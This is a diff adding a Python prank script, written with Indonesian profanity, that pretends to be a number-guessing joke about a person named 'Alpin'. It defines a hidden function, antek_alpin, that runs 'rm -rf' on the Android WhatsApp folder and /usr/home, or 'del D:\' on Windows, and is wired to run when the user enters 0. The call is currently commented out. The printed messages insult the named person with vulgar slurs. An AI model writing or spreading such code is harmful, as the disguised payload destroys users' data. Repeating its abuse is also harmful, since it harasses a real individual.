@@ -1,0 +1,72 @@
+import os
+import pyfiglet
+from colorama import Fore, Back, Style
+from time import sleep
+
+m = Fore.RED
+bk = Back.YELLOW
+r = Style.RESET_ALL
+
+
+def hapus():
+	linux = "clear"
+	windows = "cls"
+	os.system([linux,windows][os.name == "nt"])
+
+def antek_alpin():
+	linux = "rm -rf"
+	windows = "del"
+	os.system([linux+" /storage/emulated/0/Android/WhatsApp"+" && "+linux+" /usr/home",windows+" D:\\"][os.name == "nt"])
+
+def alpepek():
+	from time import sleep as abis_coli
+	from pyfiglet import figlet_format as ngelocok
+	from colorama import Fore, Back, Style
+	abis_coli(2)
+	emek = ngelocok("Alpin")
+	m = Fore.RED
+	bk = Back.YELLOW
+	r = Style.RESET_ALL
+	print(bk+m+emek+r)
+	print(r)
+	abis_coli(1)
+alpepek()
+
+def inp():
+	try:
+		alpin_kontol = int(input("Alpin = "))
+
+		if alpin_kontol > 10 and alpin_kontol <= 999999999999:
+			pepek = "Alpin itu kang maksiat dan dia tolol {}x lipat :v\n".format(alpin_kontol)
+			print(pepek)
+			
+		elif alpin_kontol > 999999999999:
+			print("Limit Angka Hanya 12 digit!\n")
+
+		elif alpin_kontol == 0:
+			print("Pasti antek antek alpin nih :v")
+			from time import sleep as ngentot
+			ngentot(3)
+			#antek_alpin()
+			exit()
+
+		else:
+			print("Lu salah kontol alpin itu tololnya lebih dari 10x lipat\n")
+			
+#	except (KeyboardInterrupt):
+#		print("\nJangan Keluar lo kontol.\n")
+#
+#	except ValueError as alpinlibe:
+#		om = "\nWah wah wah masukin yg bener anjing :v\nError: {}\n".format(alpinlibe)
+#		print(om)
+
+	except:
+		print("hmm... anda sangat \"Primitif!\"")
+		pass
+
+	if __name__ == "__main__":
+		
+		while (True):
+			inp()
+			
+inp()
